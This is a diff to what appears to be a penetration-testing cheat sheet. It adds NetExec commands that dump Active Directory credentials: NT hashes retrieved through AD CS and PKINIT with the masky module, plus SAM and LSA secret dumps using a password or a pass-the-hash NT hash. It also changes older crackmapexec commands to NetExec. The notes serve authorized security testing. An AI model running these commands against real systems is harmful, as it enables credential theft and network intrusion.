@@ -362,15 +362,39 @@ https://github.com/ohmybahgosh/RockYou2021.txt (91.6 GB)
 
 <details>
   <summary> NetExec local authentication </summary> 
+
+  ### Dump NT:hash with masky with domain user
+  #### Get ADCS server name
+  ```bash
+  sudo NetExec ldap <target_IP> -u <username> -p <password> -H <hash_NT]> -M adcs
+  ```
+  #### Retrieve the NT hash using PKINIT
+  ```bash
+  sudo NetExec ldap <target_IP> -u <username> -p <password> -H <hash_NT]> -M masky -o CA=<'ADCS_server_name'>
+  ```
+  
+  ### Dump SAM with domain user
+  ```bash
+  sudo NetExec smb <target_IP> -u <username> -p <password> -H <hash_NT]> --sam
+  ```
+  
+   ### Dump LSA with domain user
+  ```bash
+  sudo NetExec smb <target_IP> -u <username> -p <password> -H <hash_NT]> --lsa
+  ```
+</details> 
+
+<details>
+  <summary> NetExec local authentication </summary> 
   
   ### Dump SAM on local computer
   ```bash
-  sudo crackmapexec smb <target_IP> -u <username> -H <hash_NT]> --local-auth --sam
+  sudo NetExec smb <target_IP> -u <username> -p <password> -H <hash_NT]> --local-auth --sam
   ```
   
    ### Dump LSA on local computer
   ```bash
-  sudo crackmapexec smb <target_IP> -u <username> -H <hash_NT]> --local-auth --lsa
+  sudo NetExec smb <target_IP> -u <username> -p <password> -H <hash_NT]> --local-auth --lsa
   ```
 </details> 
 
